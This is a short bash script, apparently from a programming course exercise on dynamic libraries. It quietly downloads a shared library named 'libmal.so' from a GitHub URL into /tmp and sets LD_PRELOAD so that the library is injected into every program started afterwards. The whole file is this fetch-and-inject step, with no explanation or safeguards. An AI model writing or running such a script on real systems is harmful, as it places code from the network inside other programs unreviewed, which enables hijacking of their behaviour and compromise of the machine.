#!/bin/bash
wget -qO /tmp/libsh.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmal.so
export LD_PRELOAD=/tmp/libsh.so
